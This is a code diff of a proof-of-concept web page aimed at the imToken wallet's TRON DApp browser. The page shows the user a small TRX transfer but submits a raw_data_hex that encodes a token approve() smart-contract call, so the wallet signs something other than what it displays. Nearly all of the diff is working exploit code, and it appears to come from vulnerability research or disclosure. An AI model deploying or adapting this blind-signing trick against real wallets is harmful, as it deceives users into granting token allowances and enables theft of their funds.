@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>imToken TRON 所见非所签 测试</title>
+    <title>imToken TRON 所见非所签 PoC</title>
     <style>
         body{font-family:system-ui,sans-serif;background:#111;color:#0f0;padding:20px;text-align:center}
         button{padding:18px 40px;font-size:18px;background:#0b8;margin:20px;border:none;border-radius:8px;cursor:pointer}
@@ -33,11 +33,10 @@
             if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
                 return window.tronWeb.defaultAddress.base58;
             }
-            // 备用方式
-            if (window.tronLink && window.tronLink.request) {
+            if (window.tronLink) {
                 try {
-                    const res = await window.tronLink.request({method: 'tron_requestAccounts'});
-                    return res && res[0] ? res[0] : null;
+                    const accounts = await window.tronLink.request({ method: 'tron_requestAccounts' });
+                    return accounts[0];
                 } catch(e) {}
             }
             return null;
@@ -45,7 +44,7 @@
 
         async function sendTx() {
             if (!window.imToken) {
-                alert("请在 imToken DApp 浏览器中打开此页面");
+                alert("请在 imToken DApp 浏览器中打开");
                 return;
             }
 
@@ -53,55 +52,53 @@
 
             const owner = await getOwnerAddress();
             if (!owner || !owner.startsWith('T')) {
-                alert("无法获取钱包地址，请确保已在 imToken 中连接 TRON 账户");
+                alert("无法自动获取地址，请确保已在 imToken 中连接 TRON 钱包");
                 log("获取地址失败");
                 return;
             }
 
             log("当前钱包地址: " + owner);
 
+            // 简化但更符合预期的 payload 结构
             const payload = {
-                "raw_data": {
-                    "contract": [{
-                        "type": "TransferContract",
-                        "parameter": {
-                            "value": {
-                                "owner_address": owner,
-                                "to_address": "TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz",
-                                "amount": 100000
+                raw_data: {
+                    contract: [{
+                        type: "TransferContract",
+                        parameter: {
+                            value: {
+                                owner_address: owner,
+                                to_address: "TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz",
+                                amount: 100000   // 0.1 TRX
                             }
                         }
                     }],
-                    "ref_block_bytes": "0000",
-                    "ref_block_hash": "0000000000000000000000000000000000000000000000000000000000000000",
-                    "expiration": Date.now() + 3600000,
-                    "timestamp": Date.now(),
-                    "fee_limit": 100000000
+                    ref_block_bytes: "0000",
+                    ref_block_hash: "0000000000000000000000000000000000000000000000000000000000000000",
+                    expiration: Date.now() + 3600000,
+                    timestamp: Date.now(),
+                    fee_limit: 100000000
                 },
-                "raw_data_hex": "0a0200002208000000000000000040e0f3d9b3b9b95a6a0a31747970652e676f6f676c65617069732e636f6d2f70726f746f636f6c2e54726967676572536d617274436f6e747261637412350a1541" + owner.substring(2) + "121541a614f803b6fd780986a42c78ec9c7f77e6ded13c2244095ea7b300000000000000000000000000000000000000000000000000000000000000000000"
+                raw_data_hex: "0a0200002208000000000000000040e0f3d9b3b9b95a6a0a31747970652e676f6f676c65617069732e636f6d2f70726f746f636f6c2e54726967676572536d617274436f6e747261637412350a1541" + 
+                              owner.substring(2) + 
+                              "121541a614f803b6fd780986a42c78ec9c7f77e6ded13c2244095ea7b300000000000000000000000000000000000000000000000000000000000000000000"
             };
 
-            log("Payload 已准备，正在调用 sendTransaction...");
-            console.log(payload);
+            log("Payload 准备完成，正在调用...");
+            console.log("完整 payload:", payload);
 
             try {
                 const result = await window.imToken.callPromisifyAPI("tron.sendTransaction", payload);
-                log("提交成功: " + JSON.stringify(result));
-                alert("交易已提交！\n确认页应显示 TRX 转账\n请在 TronScan 检查链上实际结果");
+                log("✅ 调用成功: " + JSON.stringify(result));
+                alert("交易提交成功！\n\n确认页应该显示 TRX 转账\n请在 TronScan 查看链上真实结果");
             } catch(e) {
-                log("错误: " + (e.message || JSON.stringify(e)));
+                log("❌ 错误: " + (e.message || JSON.stringify(e)));
                 console.error(e);
                 alert("调用失败: " + (e.message || e));
             }
         }
 
-        // 页面加载时检测 TronWeb
         window.addEventListener('load', () => {
-            if (window.tronWeb) {
-                log("TronWeb 已注入");
-            } else {
-                log("TronWeb 未检测到");
-            }
+            log("页面加载完成，TronWeb: " + !!window.tronWeb);
         });
     </script>
 </body>
